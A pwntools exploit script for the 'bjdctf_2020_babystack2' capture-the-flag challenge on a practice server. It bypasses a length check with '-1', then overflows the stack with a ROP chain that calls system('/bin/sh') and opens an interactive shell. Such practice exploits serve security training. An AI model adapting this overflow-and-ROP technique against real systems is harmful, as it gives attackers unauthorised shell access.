from pwn import *

context.log_level = "info"
LOCAL_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc6_2.23-0ubuntu11_amd64.so"
REMOTE_ADDR = "node4.buuoj.cn"
REMOTE_PORT = 25456

elf = ELF("./bjdctf_2020_babystack2")

gadgets = {
        "ret" : 0x0000000000400599,
        "pop_rdi_ret" : 0x0000000000400893,
        "pop_rsi_pop_r15_ret" : 0x0000000000400891,
        }

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
            break *0x40081c
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
#    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def attack():
    sock.sendlineafter(b"[+]Please input the length of your name:\n", b"-1")
    payload = b"A" * 0x10
    payload += p64(gadgets["ret"])
    payload += p64(gadgets["pop_rdi_ret"])
    payload += p64(next(elf.search(b"/bin/sh\x00")))
    payload += p64(elf.plt["system"])
    sock.sendafter(b"[+]What's u name?\n", payload)

if __name__ == "__main__":
    attack()
    sock.interactive()



